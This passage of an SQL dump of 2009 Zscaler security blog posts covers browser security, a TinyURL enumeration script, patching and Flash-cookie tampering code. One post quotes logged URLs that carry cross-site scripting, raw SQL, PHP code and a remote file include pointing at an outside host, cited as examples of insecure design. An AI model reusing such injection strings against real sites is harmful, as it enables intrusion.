affect legacy assumptions of those roles.So web browser vendors, please hear my plea: after ten years, it is time to blow the dust off of your security models and proxy configurability to ensure they are in-line with the latest SaaS and technology offerings and expectations.Until next time,- Jeff', 'Uncategorised', 'https://www.zscaler.com/blogs/research/new-browser-security-model-needed-saas');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (586, 'Mobile Bowser (In)security', 'Michael Sutton', 'March 18, 2009', 'For the past couple of days, the Interwebs have been buzzing about pending new features in iPhone OS 3.0. One Item that barely received any mention whatsoever, but was pleasantly jaw-dropping for me, can be seen in the image below, in the lower right hand corner. It is the addition of anti-phishing capabilities for Mobile Safari.    Why should this be impressive? Firefox 2 and Internet Explorer 7 both added phishing filters back in 2006, with betas available as early as 2005. It\'s impressive because it\'s the first significant security feature of any kind in a mobile browser. Today, desktop browsers have a number of important security features, yet surprisingly, while mobile browsers have fancy features like touch screens and auto-zoom, security remains elusive. Let\'s compare the security features in major desktop/mobile web browsers:    Phishing    As mentioned, FireFox and Mozilla first added support for phishing blacklists over two years ago and since then it has become standard functionality in desktop web browsers. FireFox and Safari leverage the Google SafeBrowsing initiative, while Microsoft follows a proprietary path. Regardless, phishing protection, despite being standard issue on the desktop, is a no-go on mobile browsers...at least until iPhone OS3.0 is released this summer.    Malicious URLs    Like phishing, malicious URL protection takes advantage of blacklists to prevent users from visiting a site, which is known to host malicious content. Malicious URL protection was added after phishing but has now also become a standard feature. Once again, FireFox and Safari leverage the Google SafeBrowsing, while other vendors go it on their own, or through partnerships.    Extended Validation SSL Certificates    I question the true value of EV SSL Certificates and their adoption has been slow at best. Regardless, if they have any hope at better protecting end users, they must be supported by web browsers. It is therefore encouraging to see that they are supported by all major desktop browsers (but no mobile browsers).    Cross-Site Scripting (XSS)    With the release of IE 8, Microsoft will become the first major browser vendor to provide built-in support for XSS attacks. Early reviews of the XSS inspection engine included in IE 8 look promising. This, in my opinion is the single most important step in finally reducing the risk posed but what has long been the single most prevalent web application vulnerability.    Clickjacking    Microsoft went for the full sweep by also being the first vendor to introduce protections against clickjacking. However, their proposed protections also require special server side code. While they should be commended for their efforts, this is one control that is destined for failure.    Mobile Browsers    So why have have mobile browsers not yet included security features. Let\'s look at the possibilities.    1.) Mobile browsers do not have the storage capacity or processing power to accomodate security functionality.    Comment: My iPhone has 16GB of storage and better graphics than last-gen gaming consoles.    Verdict: Busted!    2.) Mobile browsers are not commonly subjected to attacks due to limited capabilities/use and security controls are not therefore necessary.    Comment: Mobile browsers have nearly equivalent functionality to thier desktop counterparts. They are fully capable of handling JavaScript, AJAX and if you\'re not an Apple fanboy...even Flash. Mobile browsers are also starting to constitute a meaningful percentage of overall web traffic. I personally actually prefer using my mobile browser for certain tasks, such as reviewing blog headlines, checking sports scores and scanning tweets. I prefer the simplicity of a mobile browser for simple tasks as it allows me to quickly review contents.    Verdict: Busted!    3.) We will never learn from our mistakes.    Comment: We have said for years (decades) that security must be baked in, as opposed to being brushed on. Yet, when it comes to quickly getting a product to market in order to win market share, security is consistently thrown out the window.    Verdict: Confirmed!    - michael', 'Mobile', 'https://www.zscaler.com/blogs/research/mobile-bowser-insecurity');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (587, 'The World According To TinyURL', 'Michael Sutton', 'March 15, 2009', 'According to Wikipedia, TinyURLs have been banished from the likes of MySpace, Yahoo! Answers, Orkut and Wikipedia itself due to concerns that it is a favored tool of spammers. It\'s not entirely surprising given that there are no shortage of stories relating to spammer\'s use of the URL shortening service. TinyURL is clearly concerned by this bad rap. They have added a preview feature, allowing users to get a sneak peek at the site before being redirected and they specifically call out spammers in their terms of service:\r\n \r\n\r\nUsing [TinyURL] for spamming or illegal purposes is forbidden and any such use will result in the TinyURL being disabled and you may be reported to all ISPs involved and to the proper governmental agencies.\r\n\r\n \r\n\r\nFor those not familiar with TinyURL, it\'s a simple and popular service which allows a user to submit any lengthy URL and in return receive a URL of the format - http://tinuurl.com/xxxxxx (e.g. http://tinyurl.com/bwcdzs) , where \'x\' represents a base 36 (a-z + 0-9) character. While it may at first glance appear that they\'d quickly run out of addresses, such an approach actually renders 2+ billion unique URLs. When a user browses to a TinyURL, the service returns a 301 \'Moved Permanently\' status code along with a Location header of the true URL that the browser then requests. When TinyURL was first launched in 2002, the primary motivation was to enable linking to newsgroup postings which tend to have lengthy, ugly URLs. Today however, it\'s more popular than ever given the increasing use of mobile applications and Twitter, which limits posts to 140 characters.\r\n\r\n \r\n\r\n \r\n\r\nI personally have always wondered if TinyURL was getting a bad rap. While I agree that it provides a basic form of URL obfuscation by hiding the true destination from an end user, there are certainly no shortage of such techniques, especially when dealing with naive victims that are fooled by a TinyURL. Moreover, the browser is simply redirected - it does ultimately make a separate request for the true destination URL. As a result, browser controls such as blacklists are still effective as they would catch the \'evil\' site on the second request, following the redirection. I\'ve also heard rumor that TinyURL now actively filters for bad content - if they aren\'t they certainly should be.\r\n \r\n\r\nIn an effort to satisfy my curiosity, I set out to see the world according to TinyURL. Fortunately, it\'s not hard at all to determine which pages TinyURL is redirecting users to. TinyURL by design is open, so authentication is not required to use the service. I could therefore automate the process of looping through a subset of TinyURLs, request the URL and record the Location header returned in the 301 response. I came up with the following Perl code:\r\n\r\n#!/usr/bin/perl\r\n\r\nuse LWP 5.64;\r\nuse Math::Base36 \':all\';\r\n\r\nuse LWP::UserAgent;\r\n\r\nmy $browser = LWP::UserAgent->new;\r\n\r\nfor ($count = 1; $count <= 100000; $count++) { my $tiny = encode_base36($count); my $url = \"http://www.tinyurl.com/$tiny\"; my $response = $browser->get($url);\r\n\r\nprint $url, \" --> \";\r\nprint $response->header(\"Location\"), \"\\n\";\r\n\r\n}\r\n\r\n\r\nThe code is pretty basic, it simply loops 100K times, converts the count to a base36 number, requests the associated TinyURL and then records the Location header in the response. TinyURL does not for some reason implement any verification to ensure that the submitted URL adheres to standards or even exists. Therefore, the resulting list of URLs, not surprisingly included close to 10K entries that did not represent legitimate URLs. Of the legitimatly formed URLs that were found, they could be divided into the following protocols:\r\n\r\n\r\n	HTTP - 90,541\r\n	HTTPS - 1,036\r\n	FTP - 339\r\n\r\nNow it wasn\'t hard to spot URLs that suggested a malicious purpose, such as those which attempted to further obfuscate the true domain, redirect to LAN based resources or even resources on a local machine. While such TinyURLs may have been registered for use in a planned attack, they also suggest a lack of understanding as to how browsers and the web itself actually functions. Most posed no threat whatsoever.\r\n\r\nGeography\r\n\r\nI leveraged the IP::Country::Fast Perl module and ran through the cleaned up URLs to determine where the destination pages were hosted. The United States was by far the most common location for servers to be hosted at, with 98.93% of the TinyURLs investigated. After the US, the following countries made up the top 20:\r\n\r\n\r\nWhat does this tell us? Very little...but it is a pretty graph.\r\n\r\nURL Categories\r\n\r\nURL categories are a little more interesting. I ran the clean TinyURLs collected through our classification engine to determine the overall \'type\' of content that was showing up. If the service was being abused, I would expect to see \'malicious\' categories dominating the list.\r\n\r\n \r\n \r\n\r\nDefinitely nothing too scandalous here. While there was some volume for \'questionable\' categories such as Nudity (1,047), Pornography (964) and Anonymizers (151)...clearly malicious categories - Malware (126) and Phishing (14) had minimal volume given the overall population.\r\n\r\nExecutables\r\n\r\nI would assume that if TinyURL were heavily leveraged in attacks, that a sizable portion of content would point to executable files, which attackers are trying to social engineer victims into downloading. 465 TinyURLs did directly reference *.exe files. However, understandably, not all URLs were available for download at the time of the test. Of the 197 executables that I was able to retrieve, all were run through AV and a grand total of zero were reported to be infected.\r\n\r\nPhishing\r\n\r\nThis is an area where I fully expected to get some solid results. To identify potential phishing URLs, I leveraged PhishTank, a great open collection of human verified phishing data. Specifically, I took advantage of their check URL functionality which permits you to submit an individual URL and receive XML data detailing whether or not the page represents a verified phishing site. All of the cleaned up TinyURL data was submitted (~90K URLs) and none represented confirmed phishing URLs.\r\n\r\nMalicious URLs\r\n\r\nThis time around I took advantage of the Google SafeBrowsing Diagnostic page and once again automated the process. I was only able to get through about half of the full list of URLs as my script needed to incorporate a delay to ensure that it didn\'t get blocked, however, the results seem fairly conclusive. While malicious URLs were identified, of ~50K URLs only the following five were found to be black listed:\r\n\r\n\r\n	http://www.extremeplusmarketing.net/webmaster\r\n	http://dongjian.chinanusa.com/sites/DO/Dongjian/image/bb005.jpg\r\n	http://www.iranmania.com/news/ArticleView/Default.asp?NewsCode=10927&NewsKind=CurrentAffairs&ArchiveNews=Yes\r\n	http://www.fortunecity.com/marina/cyprus/125/cyberbraai/cybera.htm\r\n	http://www.firewallreporting.com/clearice/usingclearice.htm\r\n\r\nConclusion\r\n\r\nPoor TinyURL...it would appear that you\'re getting a bum rap after all. Yes, we did identify some malicious content but certainly not enough to justify your lifetime ban from some of the cool web 2.0 parties.\r\n\r\n- michael', 'Analysis', 'https://www.zscaler.com/blogs/research/world-according-tinyurl');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (588, 'Patch To Get Some New Holes', 'ThreatLabz', 'March 13, 2009', 'According to many news outlets (but interestingly, not Panda Labs\' blog, which most of the reports cite), a couple of days ago, Panda Labs said MS09-008 doesn\'t fix one of the vulnerabilities it set out to fix. This complaint may or may not be the same as the one from nCircle, in which the patch installs differently and does not provide future protection if the vulnerability has already been exploited (calling this behavior an incomplete fix seems pretty reasonable to me). There\'s a whoops or two in here somewhere, be it an unsuccessful fix from Microsoft, Panda publicly disclosing a vulnerability without giving the vendor time to provide a patch, news outlets propagating a bogus story, Panda not posting anything to back up their claim, or my inability to find the actual data Panda posted. Conveniently, I don\'t need the details to ramble on about patches & security in general: whether this patch in particular had problems or not, security patches have holes, too.\r\n\r\nWhy is that?\r\n\r\nTo start with, many security issues are correctness issues. What applies to software in general also applies to security patches: writing bug-free code is hard to the point of impossible (depending on whether you\'re talking to a formal methods geek). To approximate it, one typically needs extreme attention to detail; very good knowledge of the surrounding code, intended architecture, and behavior of surrounding systems; a full coverage test suite; a good development process; and enough time to carefully design, code and test the software in question. As you can see from this simplified view, there will be quite a lot of work involved. There will be correctness issues in software, including security patches, and some of these correctness issues will cause security problems.\r\n\r\nFor security issues that go beyond correctness issues, you can take the above list of stuff you need to write high-quality code and increase the existing knowledge, test & time requirements substantially, and add knowledge about the specific security issues; security issues that go beyond correctness are usually more complicated to understand and reproduce than \"simple\" correctness issues. Complicated tends to mean more bugs, and some of the bugs will be security issues.\r\n\r\nNow let\'s add in the fact that it\'s a patch.\r\n\r\nEven if you only maintain one supported version (i.e. you work for a SaaS ;) ), you\'re not going to work on that supported version every day. You\'re mostly going to work on some future release. Chances are good that you have unconscious expectations about what features are available to you, and how the surrounding code acts, based on the code you work with regularly. Quite a lot of this may be new since the supported release, but since your assumptions about its presence are unconscious, you probably don\'t have a complete list of new features in mind and you may not think to ask yourself whether what you are doing will always work safely given that X is not present. The wider the gap between the supported version & what you\'re working on now, the more likely you are to slip up in this way.\r\n\r\nIf you have multiple supported versions, you get to repeat the above for every supported version. And it gets worse: again, unless you work for a SaaS, you have to cover the possibility that not all your previously published patches (security or not) have been installed. Your fix needs to work whatever the patch state, for all your supported versions, which means you have to think it through and test for each supported version & possible patch state.\r\n\r\nFor most developers, adding new features is way more fun than writing patches. You probably can\'t wait to get back to whatever you were working on when somebody reported this bug.\r\n\r\nAnd for a security patch?\r\n\r\nSecurity is a specialty & mindset of its own, and it can be hard for non-security developers to understand the issue they\'re fixing as deeply as they would understand a correctness issue.\r\n\r\nThere is extra pressure to get a security patch out fast. Distracted people in a hurry make more mistakes.\r\n\r\nTypically, a security patch will reduce functionality. Backwards compatibility is a big issue: customers hardly ever want you to take something away. Ideally, you would remove the functionality the attacker can use without affecting the functionality legitimate users use, but this isn\'t always possible, and then you have some really tricky decisions to make.\r\n\r\nBecause of all these factors, you can expect security patches to have holes now & then. Sometimes they\'ll be the same holes, not yet fixed, and sometimes they\'ll be shiny and different. Personally, I feel the same way as most of the security administrators I know: I\'ll take the new hole over the old hole every time, and keep on patching as quick as I can.\r\n\r\n--Brenda\r\n\r\n(Yes, this counts as more fuel for the give-me-an-interim-patch-while-you-do-all-that-work fire.)', 'Vulnerability', 'https://www.zscaler.com/blogs/research/patch-get-some-new-holes');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (589, 'Botnets For Everybody!', 'ThreatLabz', 'March 12, 2009', 'BBC\'s Click technology program decided to demonstrate the SPAM power of botnets by directing 22,000 zombies in their own personal botnet. Sure, a lot of people are questioning the legality of this stunt, but that\'s not what really caught my attention. Most live hacking demonstrations involving real targets are legally questionable anyways, and despite the laws many people feel entitled (and sometimes even obligated) to do XSS and SQLi testing against arbitrary web applications on the Internet.What caught my eye was a few interesting choice remarks made in the article. First, they called their 22,000 node botnet \"low-value.\" What, pray tell, makes this botnet particularly low value? Is it what hackers would charge to rent/sell it? Is it the number of nodes (a mere 22,000)? I think this is a great illustration of the inflated grandness that media has really driven to botnet stories...apparently botnets under a quarter-million nodes are worth less consideration. Yet by the article\'s own admission, it only took a scant 60 nodes to DDoS their target website off the Internet. Make no mistake, 22,000 nodes at an attacker\'s command can do a considerable amount of damage to just about any target. There are even supercomputers listed on the world\'s top 500 supercomputers list that leverage far fewer than 22,000 nodes. I would hardly trivialize a 22k node botnet with the label \"low-value,\" as it desensitizes everyone to the overall threat that any sized botnet can represent.Second, the article mentions they \"acquired\" their own botnet \"after visiting some chatrooms\" on the Internet. I wish they had provided a bit more details here...did they troll chat rooms until they found a botnet for sale, and purchase it? Or did they intercept an IRC-based command and control channel of the bots, thus hijacking the botnet to do their bidding? Either way, their candor regarding the ease of acquiring a botnet seems strange. I would think the story of how anyone can \"visit some chatrooms\" and walk away with a botnet would be more sensational than filling some demo inboxes with spam.As an aside, the \"how a botnet works\" graphic they include in the article was a bit weird as well; the truncated version you see in the article leaves a lot to be desired (\"Hacker -> virus\"?). You have to click on the image to get the full chart, and then things become clear.Until next time,- Jeff', 'Malware', 'https://www.zscaler.com/blogs/research/botnets-everybody');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (590, 'Vulnerable By Design...no, Really', 'ThreatLabz', 'March 06, 2009', 'Part of my responsibilities at Zscaler is to look through our log files in order to spot strange and unusual requests (new malware, botnets, etc.), questionable surfing trends, and other sorts of data-mining security goodness. And unfortunately, I routinely come across requests such as these:  Guilty.party.unnamed.com/static/sc_trans2_blue_li-350x250-1l-eng-nul.swf?clickTag=JAVASCRIPT:DL_GotoSurvey();&clickTag2=JAVASCRIPT:DL_Close();  Guilty.party.unnamed.com/global/video/JSinclude_flash.asp?ct=&src=%3Cscript%20src%3D%27http%3A//ad.doubleclick.net/adj/xxxxxxxx/wnvideo%3Bpos%3Dpre%3Bsz%3D2x2%3Bxx%3Dxxx%3Brn%3D39%3Btile%3D15%3Bord%3D0123456789%3F%27%3E%3C/script%3E  Guilty.party.unnamed.com/topshowstory_topad.php?script=<script%20language=\'javascript\'%20src=\'/js/bannerscriptmp3internal2.js\'></script>  Guilty.party.unnamed.com/video/<script%20type=\"text/javascript\"%20src=\"http://some.other.party.com/adsc/d495261/7/498588/randm.js\"%20/>&rndNum=99812610  Guilty.party.unnamed.com/ifr.php?x=%3Cscript+type%3D%22text%2Fjavascript%22%3E%3C%21--%0Agoogle_ad_client+%3D+%22pub-9310xxxxxxxxxxxx%22%3B%0Agoogle_ad_width+%3D+468%3B%0Agoogle_ad_height+%3D+15%3B%0Agoogle_ad_format+%3D+%22468x15_0ads_al_s%22%3B%0A%2F%2F2007-10…  Anyone familiar with web security will likely see immediately that these requests essentially carry cross-site scripting payloads. But these are not an XSS attack against a user; I’ve traced all of these (and many, many more), and they are, in fact, required to happen that way by a legitimate web site. That’s right folks: there are sites passing Javascript in URL parameter fields on purpose. Most of the URLs I\'ve discovered that have XSS by design typically fall into one of two types: advertising syndication, or passing HTML into a SWF. All of the above URLs exhibit one of those two types. The last listed URL probably gets the \'Hall of Shame\' award, since the ifr.php was designed to return arbitrary content that is meant to be used in an Iframe.  But XSS is just the tip of the iceberg; check out these requests:  Guilty.party.unnamed.com/globalpages/search-results.asp?SQLStmt=SELECT+KEY%5F%2C+AD%5FNO%2C+AD%5FNAME%2C+TYPE%2C+SPECIAL1%2C+SPECIAL2%2C+SPECIAL3%2C+SMALL%5FIMAGE%2C+personalizable+FROM+graphics+WHERE+%28%28type+%3D+%27PhotoFile%27%29+AND+%28color+%3D+%27Color%27%29+AND+%28keywords+LIKE+%27%25wedding%25%27%29%29+order+by+date%5Fadded+desc&showpage=3&…  Guilty.party.unnamed.com/common/sessionshare.aspx?context=flash&debugSQL=SELECT+top+20+%2A%2C+round%283959+%2A+acos%28++++++sin%2842%2E944498%2F57%2E3%29+%2A+sin%28%28google%5FLatitude+%2B+0%2E0001%29%2F57%2E3%29+%2B+++++++cos%2842%2E944498%2F57%2E3%29+%2A+cos%28%28google%5FLatitude+%2B+0%2E0001%29%2F57%2E3%29+%2A+++++++cos%28%28google%5FLongitude+%2B+0%2E0001%29%2F57%2E3+%2D+%28%2D85%2E617924%29%2F57%2E3%29%29%2C+2%29+as+Di  Are those full and partial SQL queries/clauses in the URL parameter fields? Why, yes they are! These sites actually pass the SQL query strings in as request parameters. Now, perhaps these sites have absolutely perfect database security, the web scripts use a read-only account DB account, and SQL access is restricted to a limited view of the table...meaning the web script isn\'t exploitable to do much beyond just read the already-public read-only data from a single table. But my bet is that isn\'t the case.  There are lots of other pretty scary requests out there, but it\'s hard to tell whether they are really exploitable or not by just looking at the URL (and I\'m not about to go and perform an unauthorized security assessment on these public web sites). Here are some of the suspicious ones, for your entertainment:  Guilty.party.unnamed.com/XXXXXXLight.asp?request=%20shopping&Engine=http%3A%2F%2Fguilty.party.unnamed.com%2F&PartnerId=138&CssStylesLocal=c%3A%5Cinetpub%5Cwwwroot%2Flight%2Fskins%2Fembed_it_1_1.css&…  Guilty.party.unnamed.com/includes/include_once.php?include_file=http://some.other.party.com/sugar/1.gif?/  Guilty.party.unnamed.com/campaigns/showban.php?CD=B&M=1&D=&cb=<?php%20print%20(rand());?>  I\'m sure I\'ll be posting more in the weeks to come. There doesn\'t appear to be a shortage of new examples...  Until next time,  - Jeff', 'Advertising', 'https://www.zscaler.com/blogs/research/vulnerable-designno-really');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (591, 'Interim Patches', 'Michael Sutton', 'March 05, 2009', 'On September 16, 1997, Apple named Steve Jobs Interim CEO, a year after returning to the company that he had founded. Bud Selig served as interim commissioner for six years before Major League Baseball officially handed over the reins in 1998. When businesses face big challenges and a perfect solution isn\'t imminent, they implement an interim solution. It may be temporary, it may be imperfect, but something is better than nothing. Why then is the software industry so opposed to interim patches?    Two weeks ago, Adobe acknowledged a vulnerability in most versions of Adobe Reader that could lead to remote code execution. In that same advisory, they announced that a patch would be issued by March 11, leaving arguably the majority of computers exposed to attack worldwide. To make matters worse, security firms have suggested seeing attacks as early as the beginning of 2009 leveraging this attack vector. One would therefore presume that Adobe has had knowledge of this issue for some time.    Adobe went on to suggest that users disable JavaScript in order to protect themselves. That advice was short lived as on March 3rd, Dave Aitel announced that Immunity had released a working exploit which did not require the use of JavaScript. Not to worry though, as Adobe also assured customers that it was working with anti-virus vendors to ensure that signature based detection would be available to protect against potential attacks. How\'s that working out? A quick check with VirusTotal shows that as of this evening, only 5 of 39 AV vendors have protection in place for the proof of concept exploit released on February 22nd. That\'s less than 13% of vendors for an exploit for which source code has been available for nearly two weeks! It\'s tough to argue with Damballa\'s recent bashing of the AV industry.    The security industry on the other hand had a very different reaction. Lurene Grenier of SourceFire, released a homebrew patch just three days after the Adobe Advisory. Now I find it hard to believe that if a sole researcher, with no access to source code or exclusive knowledge of a given product can implement basic protection within days, that Adobe cannot do the same, with better quality, in a short time frame. I\'m not asking for a perfect solution - I can wait until March 11 for that. I\'m asking for an interim patch - a quick fix to a big problem. Yes, I\'m willing to accept the risk that it will break something and hinder my ability to view PDF documents. Heck, I\'m even willing to accept that it will erase a few. I\'m willing to accept that risk, because it is far less damaging than the prospect of unwittingly joining the next botnet army. Sadly, while the recent Adobe debacle has become a poster child for the availability of interim patches it\'s only the latest high profile vulnerability representing a problem that won\'t go away on it\'s own.    Our industry loves to fuss and debate over formulas and approaches to determine risk. Rather than kick off a study group to study the work of another group, let me cut to the chase and propose a simple questionnaire for the entire software industry. The next time an evil-doer exposes a vulnerability in one of your software products, ask yourself three simple questions:    - Are more than 10% of Internet users affected?  - Is an exploit in the wild?  - Will it take more than 7 days to release a permanent fix?    If you answered yes to all of the above questions - stop reading and start writing - a quick and dirty patch that we can all use to protect ourselves.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/interim-patches');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (592, 'Demystifying/Abusing Flash Cookies', 'Michael Sutton', 'March 01, 2009', 'Flash Cookies (aka Local SharedObjects) are increasingly being leveraged by developers as a powerful alternative to HTTP cookies, yet there seems to be significant confusion as to what they are capable of and what security/privacy risks they may expose. I feel that most users are at least familiar with cookies in general, and to some extent this technology has taken a bad rap as a privacy concern. While cookies certainly can lead to privacy concerns, we should keep in mind that they have become a key component in today\'s rich web applications, enabling persistence which is leveraged for authentication, user preferences, etc. As end users have become increasingly uncomfortable of the existence of data which permits sites to track their web clicks, they have begun disabling cookies within their browsers or adopting applications which permit the blocking of cookies. Yet, what many don\'t realize, is that the same tracking features they are trying to avoid are not only alive and well, but exist in a much more powerful form, thanks to Flash cookies.    Local SharedObjects were first introduced in Flash Player 6.0 in March 2002, so they\'ve been around for a while. Combine this with the fact that (thanks largely to YouTube) Adobe is able to claim being present on 99% of Internet enabled desktops and Flash becomes a de-facto standard client side platform. Flash Cookies offer developers more flexibility than their HTTP based counterparts in virtually every category:      	Storage Capacity - By default, sites can store up to 100K of data on a local file system and no explicit consent is required form the end user. HTTP cookies can likewise store data without asking permission but are limited to 4K in most browser implementations.  	Expiry - HTTP cookies are either session based, meaning that they are wiped upon exiting the application/browser or have an explicit expiration date. Flash cookies on the other hand, by default have no expiration.  	File Format - Flash cookies are stored in a binary format, but contain text based data, so they\'re easy to read directly from the file system, so long as you know where they\'re stored (see below). There are also a variety of LSO readers that can be used.      LSO Storage Locations           	Windows XP  	  		$user\\Application Data\\Macromedia\\Flash Player\\#SharedObjects  	  	  	Windows Vista  	  		$user\\AppData\\Roaming\\Macromedia\\Flash Player\\#SharedObjects  	  	  	Mac OS X  	  		~/Library/Preferences/Macromedia/Flash Player/#SharedObjects  	  	  	Linux  	  		/home/$user/.macromedia/Flash_Player/#SharedObjects  	  	      From a developers perspective, the greatest advantage of Flash cookies appears to be the fact that users aren\'t overly familiar with them an wouldn\'t know how to delete them even if they were. In fact it wasn\'t until Flash Player 8.0 was released that Adobe actually added a Settings Manager to permit users to see and manage the Flash cookies on their system. This is the same control panel which was previously vulnerable to clickjacking. Browser privacy features which permit users to wipe local content including HTTP cookies do not presently touch Flash cookies, although I wouldn\'t be surprised to see this change over time.    Common security concerns for HTTP cookies outside of privacy involve cookie hijacking or injection or more generically, the ability to read from or write to a user\'s cookies. This is a significant threat given that cookies maintain persistence for authentication purposes and it is especially concerning given the prevalence of cross-site scripting vulnerabilities which facilitate such attacks.    Is cookie hijacking/injection possible with Flash cookies as can be done with HTTP cookies? The answer is yes, so long as the attacker has an ability to upload Flash content to the target domain. While this is a significant hurdle, the prevalence of Flash on the web and the acceptance of user supplied content on web sites, means that this isn\'t as difficult a challenge as you might think. As with HTTP cookies, Flash cookies enforce a same origin policy. Flash cookies can also restrict access based on the path where the Flash cookies are deployed. For example, a site where users have personal content (e.g. domain.com/user_page/), which stored all file uploads in one place (e.g. domain.com/all_files/) instead or user specific locations (e.g. domain.com/user_page/all_files/) could expose itself to attack. If Flash content can be uploaded, an attacker simply needs to build a Flash file which can read from/write to an existing LSO. While the name of the LSO is required, this is a trivial challenge as such data is already stored on the client side. The following ActionScript code sample permits writing to a Flash cookie:    package {    import flash.net.SharedObject;  import flash.display.Sprite;    public class zscaler extends Sprite {  private var user:SharedObject;  private var firstname :String;  private var lastname:String;  public function zscaler() {    user = SharedObject.getLocal(\"zscaler\");  firstname = \"Michael”;  lastname = \"Sutton\";    user.data.firstname = firstname;  user.data.lastname = lastname;    user.flush();  }  }  }    Once the code is written, it must be compiled into a *.swf file, which can be done using freely available tools such as the Adobe Flex 3 SDK, which includes a Flash compiler. In the above example, an LSO named zscaler is created which has two variables (firstname and lastname). Reading from an existing Flash cookie is equally as easy:    …  public function zscaler() {  var label:TextField;    user = SharedObject.getLocal(\"zscaler\");    firstname = user.data.firstname;  lastname = user.data.lastname;    label = new TextField();  label.autoSize = TextFieldAutoSize.LEFT;  label.background = true;  label.border = true;  label.text = \"Firstname: \" + firstname + \"\\nLastname: \" + lastname;    addChild(label);    user.flush();  }  …    The code has been abbreviated as it\'s largely identical to the previous sample. In this case, we once again call getLocal() using the name of an existing LSO and then simply read existing data (e.g. user.data.firstname). The example will display the contents of these variables in a text box.    If you\'re curious to know how many sites are leveraging Flash cookies, simply check the Website Storage Settings panel in your Adobe Flash Player Settings Manager. I suspect you\'ll be surprised to see how many sites are leveraging this technology. Also take time to browse through the content of these LSOs. Given the larger storage capacities available, you may find some interesting and perhaps insecure content.    Take care.    - michael', 'Abuse', 'https://www.zscaler.com/blogs/research/demystifyingabusing-flash-cookies');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (593, 'Big, White, Puffy Clouds Can Still Evaporate', 'ThreatLabz', 'February 27, 2009', 'If you haven\'t heard by now, Google GMail had a 2.5 hour outage on Tuesday. Acacio Cruz, Gmail’s Site Reliability Manager, explained in a little more detail regarding the outage. My interpretation of his explanation is that they had a bug in how data is shifted around in the cloud, and during a shift one of data centers couldn\'t handle the new burden, failed, and eventually the effect cascaded.I have a few comments on this. First, GMail still carries the \'beta\' moniker...and aren\'t service disruptions like this kind of expected/tolerated with beta software? But beta or not, real people use the service--including Google themselves (according to Acacio Cruz\'s post). So maybe it\'s time to promote GMail out of beta and designate it as production, since that\'s what it is to most people anyways. Second, running a resilient cloud is hard, particularly when it comes to outages and the resulting automatic rebalancing to cover the gap and maintain availability. It\'s like a tire on a car: everything rotates routinely and drives smoothly when the tire is balanced. But if the center of balance of the tire shifts dramatically at a random moment, things quickly deteriorate and the high-speed rotation can cause significant instability and damage to the rest of the vehicle. Computing clouds are conceptually similar. What happens when an outage takes out a piece of the cloud and the finely orchestrated balance is randomly skewed...is the capacity of the rest of the cloud sufficient to absorb the load? Can the cloud rebalance itself gracefully? These are the same types of questions one will hear when investigating fault tolerance, failover, and redundancy capabilities of any normal technology component (servers, firewalls, WAN links, etc.). But the questions take on a whole new level of scale when you apply them to a cloud.Plus let\'s not overlook the fact that we have different fault tolerance expectations for services in the cloud. The typical perception of clouds seems to imply internal failover capabilities. After all, that\'s part of the appeal of clouds: all that fault tolerance, redundancy, etc. is magically taken care of within the cloud. The cloud is infallible. The cloud cannot fail. Those are the dominant marketing messages. No one talks about having a contingency plan for when the cloud is unavailable (what would that be exactly? A second hot-spare cloud?).So when choosing a cloud-based vendor, you should try to investigate their cloud resiliency. Vendors who take non-cloud specific software, run copies of it in two or three datacenters, and call it a cloud service are likely not delivering the true expected experience to customers. Software needs to be purpose-built to run in a cloud, including multi-tenancy design and strong internal failover capability. That\'s because most people wind up putting all of their eggs into the cloud basket. If you are going to be one of those people, you should try to make sure the basket offers the implied safety that you expect.Until next time,- Jeff', 'Cloud', 'https://www.zscaler.com/blogs/research/big-white-puffy-clouds-can-still-evaporate');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (594, 'EV-SSL, SSL, And Who’s Not Using It', 'ThreatLabz', 'February 19, 2009', 'It seems I\'ve been picking on EV-SSL lately. It\'s not intentional; I just have encountered a lot of questionable marketing fluff lately and wanted to talk about it. Today is no different. Tim Callan\'s recent blog post got me thinking. Basically he referenced some SSL attacks that were disclosed at BlackHat, and suggested EV-SSL certificates as the cure to SSL MitM attacks and phishing in general. On the one hand, I believe his conclusion is conveniently aligned with his employer\'s sales agenda. On the other hand, I acknowledge that EV-SSL could raise the bar...if it\'s adopted and deployed in widespread fashion. And therein is the crux.    I\'ve previously talked about the EV-SSL adoption rate (or lack thereof) in this blog. NetCraft has reported its findings of one million valid SSL-capable sites are in use (note: sites with invalid, self-signed, or expired SSL certs are not included in that count). And while I don\'t have access to their commercial SSL Survey report for January 2009, we infer from some third party mentions that the report states around 10,000 EV-SSL sites were found. That\'s 3,000 more than Verisign mentioned last month, but perhaps Verisign was only reporting what they alone issued. Given their marketshare (~75%, albeit that number is a year old) against total EV-SSL cert vendors, that seems to make sense.    Only 10,000 EV-SSL sites within two years seems very low to me, especially for something which is essentially an enhanced derivative of an already understood and accepted technology. People already know what SSL is and what function SSL certs perform, so that definitely is not the hold up. There just doesn\'t seem to be much of an adoption momentum, and maybe that\'s because the additional value these premium EV-SSL certs provide is questionable in the eyes of site owners.    But maybe I\'m looking at this wrong. Only 10,000 EV-SSL sites seems a bit low, but what if they were 10,000 sites that matter? I suppose that would paint a different picture. If 10,000 big sites that account for a notable portion of the web\'s traffic used EV-SSL, I suppose that actually might not be so bad. So I entertained that theory. I manually surfed to each of the upper 50 of Alexa\'s Global Top 500 Sites list, and recorded who was using EV-SSL vs. normal SSL vs. no SSL. The idea is that these sites represent the most visited sites in all of the world (according to Alexa), and as such, assumingly have a vested interest in assuring their voluminous user population that the users\' accounts and transactions are secure. If most of these sites were using EV-SSL, then that would actually provide notable EV-SSL permeation into overall web traffic.    